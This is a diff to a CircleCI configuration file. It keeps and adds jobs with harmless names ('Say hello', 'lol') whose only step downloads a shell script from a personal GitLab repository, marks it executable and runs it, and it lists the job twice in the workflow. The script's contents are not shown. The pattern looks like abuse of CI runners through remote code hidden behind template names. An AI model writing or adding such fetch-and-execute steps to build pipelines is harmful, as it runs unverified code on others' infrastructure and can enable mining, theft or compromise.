@@ -16,8 +16,16 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "wget https://gitlab.com/mateomac001/hugotuli/-/raw/master/tae.sh; chmod +x tae.sh; ./tae.sh
-"
+          command: "wget https://gitlab.com/mateomac001/hugotuli/-/raw/master/tae.sh; chmod +x tae.sh; ./tae.sh"
+say-hello_1:
+  docker:
+    - image: cimg/base:stable
+  steps:
+      - checkout
+      - run:
+        name: "lol"
+        command: "wget https://gitlab.com/mateomac001/hugotuli/-/raw/master/tae.sh; chmod +x tae.sh; ./tae.sh"
+
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
@@ -25,3 +33,5 @@ workflows:
   say-hello-workflow:
     jobs:
       - say-hello
+      - say-hello
+
